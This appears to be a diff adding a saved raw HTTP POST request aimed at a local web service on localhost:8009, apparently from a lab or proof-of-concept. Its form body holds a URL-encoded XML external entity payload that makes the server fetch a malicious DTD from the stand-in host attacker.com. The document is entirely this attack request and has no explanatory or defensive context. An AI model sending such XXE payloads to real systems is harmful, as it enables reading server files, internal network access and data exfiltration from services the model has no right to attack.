@@ -1,0 +1,22 @@
+POST / HTTP/1.1
+Host: localhost:8009
+Content-Length: 161
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="133", "Not(A:Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Origin: http://localhost:8009
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost:8009/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+xml=%3C%21DOCTYPE+x+%5B%0D%0A++%3C%21ENTITY+%25+xxe+SYSTEM+%22http%3A%2F%2Fattacker.com%2Fmalicious.dtd%22%3E%0D%0A++%25xxe%3B%0D%0A%5D%3E%0D%0A%3Cx%3E%3C%2Fx%3E
